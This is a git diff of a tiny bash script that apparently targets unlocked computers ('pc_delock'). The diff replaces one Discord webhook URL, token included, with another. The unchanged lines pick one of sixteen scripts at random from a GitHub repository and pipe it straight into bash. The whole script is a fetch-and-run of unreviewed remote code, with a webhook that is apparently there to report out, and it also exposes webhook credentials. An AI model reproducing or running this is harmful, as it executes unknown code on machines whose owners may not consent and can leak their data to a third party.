@@ -1,6 +1,6 @@
 #!/bin/bash
 
-WEBHOOK_URL="https://discord.com/api/webhooks/895593267205394473/oq1QICNWHvypGXHu7AUoY5j1BD46CMv1TjD93KMxch1rU0niCLWFYjy0jK5ADhA99-ut"
+WEBHOOK_URL="https://discord.com/api/webhooks/1026544372226986046/esBmXNyXYcIajaAB-_T5taEBqaOud6c_jIWRpreOet7Eo65teeAc63ow9passnBlgxje"
 rdm=$(( RANDOM % 16 ))
 
 curl -s "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | bash
